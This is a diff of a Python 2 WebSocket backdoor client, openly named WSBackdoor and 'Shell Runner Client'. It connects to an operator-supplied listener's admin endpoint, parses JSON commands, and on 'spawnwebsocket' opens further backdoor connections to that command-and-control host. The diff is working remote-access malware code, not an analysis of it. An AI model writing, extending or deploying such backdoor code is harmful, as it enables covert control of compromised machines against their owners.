@@ -5,11 +5,16 @@ import subprocess
 import optparse
 import os
 from clint.packages.colorama.win32 import STDERR
+import json
+import platform
 
 __author__ = "f47h3r - Chase Schultz"
 
 UUID = '6faf6300-7318-11e1-b0c4-0800200c9a66'
 users = []
+ip = ''
+port = ''
+listeners = []
 
 class WSBackdoor(WebSocketClient):
     
@@ -31,7 +36,7 @@ class WSBackdoor(WebSocketClient):
             return False
     
     def opened(self):
-        self.send("Hello Server! - From Client\n")
+        self.send("Hello Server! - From Shell Runner Client\n")
 
     def closed(self, code, reason):
         print "Closed down", code, reason
@@ -64,15 +69,34 @@ class AdminWebsocket(WebSocketClient):
 
     def received_message(self, jsonObject):
         print 'RECEIVED ON ADMIN INTERFACE:\n\n %s' % str(jsonObject)
-        
+        #Delete this bit
+        ''''jsonObject = str(jsonObject)
+        decoded = json.loads(jsonObject)
+        print 'JSON OBJECT TYPE: ', type(decoded[0])
+        jsonDict = decoded[0]
+        '''
+        processor = jsonObjectProccessor();
+        processor.processObject(jsonObject)
 
 class jsonObjectProccessor():
-    
-    def spawnHandler(self):
-        pass
+    '''Process Json Command Objects'''
+    def __spawnHandler__(self):
+        print 'Made it to Spawnhandler! - Reminder CLEAN THIS SHIT UP!'
+        group = str(platform.system())
+        print 'Detected Platform: %s' % group
+        ws = WSBackdoor('http://'+ip+':'+port+'/endpoint/boxes/box1', protocols=['http-only', 'chat'])
+        ws.connect()
+        listeners.append(ws)
 
-    def decodeObject(self, object):
-        pass
+    def processObject(self, jsonObject):
+        jsonObject = str(jsonObject)
+        decoded = json.loads(jsonObject)
+        print 'JSON OBJECT TYPE: ', type(decoded[0])
+        jsonDict = decoded[0]
+        print 'Command Dictionary: ', jsonDict
+        print 'Command: %s' % jsonDict['command']
+        if jsonDict['command'] == 'spawnwebsocket':
+            self.__spawnHandler__()
 
 if __name__ == '__main__':
     usage = __doc__
@@ -90,10 +114,11 @@ if __name__ == '__main__':
                       dest='ip',
                       help='Listener IP address')
     (options, args) = parser.parse_args()
+    ip = options.ip
+    port = options.port
     try:
         adminWebsocket = AdminWebsocket('http://'+options.ip+':'+options.port+'/endpoint/admin/6faf6300-7318-11e1-b0c4-0800200c9a66/', protocols=['http-only', 'chat'])
         adminWebsocket.connect()
-        ws = WSBackdoor('http://'+options.ip+':'+options.port+'/endpoint/boxes/box1', protocols=['http-only', 'chat'])
-        ws.connect()
     except KeyboardInterrupt:
-        ws.close()
+        for socket in listeners:
+            socket.close()
